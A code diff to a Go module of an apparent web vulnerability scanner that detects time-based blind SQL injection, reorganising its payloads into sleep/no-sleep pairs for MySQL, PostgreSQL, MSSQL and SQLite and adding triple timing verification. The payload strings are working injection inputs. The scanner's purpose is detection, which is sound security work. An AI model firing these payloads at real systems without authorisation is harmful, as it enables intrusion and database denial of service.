@@ -1,7 +1,7 @@
 package sqli_time_based_params
 
 import (
-	"strings"
+	"time"
 
 	"github.com/vigolium/vigolium/pkg/core/hosterrors"
 	"github.com/vigolium/vigolium/pkg/dedup"
@@ -12,6 +12,39 @@ import (
 	"github.com/vigolium/vigolium/pkg/output"
 	"github.com/pkg/errors"
 )
+
+// sleepThreshold is the minimum response time to consider a timing injection confirmed.
+const sleepThreshold = 12 * time.Second
+
+// timePair represents a sleep/no-sleep payload pair for time-based testing.
+type timePair struct {
+	dbType   string
+	sleepVal string
+	noSleep  string
+}
+
+// payloadPairs contains sleep/no-sleep pairs for each DB type.
+var payloadPairs = []timePair{
+	// MySQL
+	{dbType: "mysql", sleepVal: "'XOR(if(now()=sysdate(),SLEEP(15),0))XOR'Z", noSleep: "'XOR(if(now()=sysdate(),SLEEP(0),0))XOR'Z"},
+	{dbType: "mysql", sleepVal: `"XOR(if(now()=sysdate(),SLEEP(15),0))XOR"Z`, noSleep: `"XOR(if(now()=sysdate(),SLEEP(0),0))XOR"Z`},
+	{dbType: "mysql", sleepVal: "if(now()=sysdate(),SLEEP(15),0)", noSleep: "if(now()=sysdate(),SLEEP(0),0)"},
+	// PostgreSQL
+	{dbType: "postgres", sleepVal: "1233'||(select 99999999 from pg_sleep(15))||'1233", noSleep: "1233'||(select 99999999 from pg_sleep(0))||'1233"},
+	{dbType: "postgres", sleepVal: `1233"||(select 99999999 from pg_sleep(15))||"1233`, noSleep: `1233"||(select 99999999 from pg_sleep(0))||"1233`},
+	{dbType: "postgres", sleepVal: "(select 99999999 from pg_sleep(15))", noSleep: "(select 99999999 from pg_sleep(0))"},
+	{dbType: "postgres", sleepVal: "(select 99999999 from pg_sleep(15)) as test", noSleep: "(select 99999999 from pg_sleep(0)) as test"},
+	// MSSQL
+	{dbType: "mssql", sleepVal: "9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999", noSleep: "9999' or 1=0 or '0'='9999"},
+	{dbType: "mssql", sleepVal: `9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999`, noSleep: `9999" or 1=0 or "0"="9999`},
+	{dbType: "mssql", sleepVal: "(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)", noSleep: "(select 1)"},
+	{dbType: "mssql", sleepVal: "(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test", noSleep: "(select 1) as test"},
+	// SQLite
+	{dbType: "sqlite", sleepVal: `9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999`, noSleep: `9999'||(select 1)||'9999`},
+	{dbType: "sqlite", sleepVal: `9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999`, noSleep: `9999"||(select 1)||"9999`},
+	{dbType: "sqlite", sleepVal: "(select like('abcdefg',upper(hex(randomblob(150000000))))) as test", noSleep: "(select 1) as test"},
+	{dbType: "sqlite", sleepVal: "(select like('abcdefg',upper(hex(randomblob(150000000)))))", noSleep: "(select 1)"},
+}
 
 type Module struct {
 	modkit.BaseActiveModule
@@ -53,13 +86,11 @@ func (m *Module) ScanPerRequest(
 		return results, nil
 	}
 
-	// Create all insertion points (uses cached provider when available)
 	points, err := scanCtx.GetInsertionPoints(ctx.Request().Raw(), ctx.Request().ID(), true)
 	if err != nil {
 		return results, errors.Wrap(err, "failed to create insertion points")
 	}
 
-	// Filter out already checked insertion points
 	rhm := m.rhm.Get(scanCtx.DedupMgr())
 	if rhm != nil {
 		points = rhm.GetNotCheckedInsertionPoints(urlx, ctx.Request(), points)
@@ -68,70 +99,20 @@ func (m *Module) ScanPerRequest(
 		return results, nil
 	}
 
-	// https://www.arneswinnen.net/2013/09/automated-sql-injection-detection/
-	payloads := []string{
-		// Mysql
-		"'XOR(if(now()=sysdate(),SLEEP(15),0))XOR'Z",
-		`"XOR(if(now()=sysdate(),SLEEP(15),0))XOR"Z`,
-		`if(now()=sysdate(),SLEEP(15),0)`,
-		// PostgreSQL
-		"1233'||(select 99999999 from pg_sleep(15))||'1233",
-		`1233"||(select 99999999 from pg_sleep(15))||"1233`,
-		"(select 99999999 from pg_sleep(15))",
-		"(select 99999999 from pg_sleep(15)) as test",
-		// MSSQL
-		"9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999",
-		`9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999`,
-		"(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)",
-		"(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test",
-		// SQLite
-		`9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999`,
-		`9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999`,
-		"(select like('abcdefg',upper(hex(randomblob(150000000))))) as test",
-		"(select like('abcdefg',upper(hex(randomblob(150000000)))))",
-	}
-
 ipScan:
 	for _, ip := range points {
-		for _, payload := range payloads {
-			// Build fuzzed request with payload
-			fuzzedRaw := ip.BuildRequest([]byte(payload))
-
-			// Parse the fuzzed raw request to HttpRequestResponse
-			fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
+		for _, pair := range payloadPairs {
+			result, err := m.testTimingPair(ctx, httpClient, ip, pair)
 			if err != nil {
+				if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
+					return results, nil
+				}
 				continue
 			}
 
-			// Copy HttpService from original request
-			fuzzedReq = fuzzedReq.WithService(ctx.Service())
-
-			var isVuln bool
-			var sendErr error
-			isVuln, sendErr = sendRequest(fuzzedReq, httpClient)
-			if sendErr != nil {
-				continue
-			}
-
-			// retry 3 times, if all are true, then it is vuln
-			for i := 0; i < 3; i++ {
-				isVuln, sendErr = sendRequest(fuzzedReq, httpClient)
-				if sendErr != nil {
-					continue
-				}
-				if !isVuln {
-					break
-				}
-			}
-
-			// check isVuln and sendErr == nil (successful request)
-			if isVuln && sendErr == nil {
-				results = append(results, &output.ResultEvent{
-					URL:              urlx.String(),
-					Request:          string(fuzzedRaw),
-					FuzzingParameter: ip.Name(),
-					ExtractedResults: []string{payload},
-				})
+			if result != nil {
+				result.URL = urlx.String()
+				results = append(results, result)
 				continue ipScan
 			}
 		}
@@ -140,26 +121,75 @@ ipScan:
 	return results, nil
 }
 
-func sendRequest(req *httpmsg.HttpRequestResponse, httpClient *http.Requester) (bool, error) {
-	timeout := false
-	resp, duration, err := httpClient.Execute(req, http.Options{IgnoreTimeoutTracking: true})
+// testTimingPair implements triple verification: sleep → no-sleep → sleep.
+func (m *Module) testTimingPair(
+	ctx *httpmsg.HttpRequestResponse,
+	httpClient *http.Requester,
+	ip httpmsg.InsertionPoint,
+	pair timePair,
+) (*output.ResultEvent, error) {
+	// Step 1: Send sleep payload (should be slow)
+	elapsed1, err := m.sendTimedPayload(ctx, httpClient, ip, pair.sleepVal)
 	if err != nil {
-		if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
-			return false, nil
-		}
-		if strings.Contains(err.Error(), "timeout awaiting response headers") {
-			timeout = true
-		}
+		return nil, err
+	}
+	if elapsed1 < sleepThreshold {
+		return nil, nil
 	}
 
-	defer func() {
-		if resp != nil {
-			resp.Close()
-		}
-	}()
-
-	if duration >= 15 || timeout {
-		return true, nil
+	// Step 2: Send no-sleep payload (should be fast)
+	elapsedNoSleep, err := m.sendTimedPayload(ctx, httpClient, ip, pair.noSleep)
+	if err != nil {
+		return nil, err
 	}
-	return false, nil
+	if elapsedNoSleep >= sleepThreshold {
+		return nil, nil // Server is just slow, not injectable
+	}
+
+	// Step 3: Send sleep payload again (should be slow again)
+	elapsed2, err := m.sendTimedPayload(ctx, httpClient, ip, pair.sleepVal)
+	if err != nil {
+		return nil, err
+	}
+	if elapsed2 < sleepThreshold {
+		return nil, nil // Inconsistent — likely false positive
+	}
+
+	fuzzedRaw := ip.BuildRequest([]byte(pair.sleepVal))
+	return &output.ResultEvent{
+		Request:          string(fuzzedRaw),
+		FuzzingParameter: ip.Name(),
+		ExtractedResults: []string{pair.sleepVal, pair.noSleep, pair.dbType},
+		Info: output.Info{
+			Description: "Time-based blind SQL injection confirmed via triple verification " +
+				"(sleep/no-sleep/sleep). Database type: " + pair.dbType,
+		},
+	}, nil
+}
+
+// sendTimedPayload sends a payload and returns the elapsed wall-clock duration.
+func (m *Module) sendTimedPayload(
+	ctx *httpmsg.HttpRequestResponse,
+	httpClient *http.Requester,
+	ip httpmsg.InsertionPoint,
+	payload string,
+) (time.Duration, error) {
+	fuzzedRaw := ip.BuildRequest([]byte(payload))
+
+	fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
+	if err != nil {
+		return 0, err
+	}
+	fuzzedReq = fuzzedReq.WithService(ctx.Service())
+
+	start := time.Now()
+	resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true, IgnoreTimeoutTracking: true})
+	elapsed := time.Since(start)
+
+	if err != nil {
+		return 0, err
+	}
+	resp.Close()
+
+	return elapsed, nil
 }
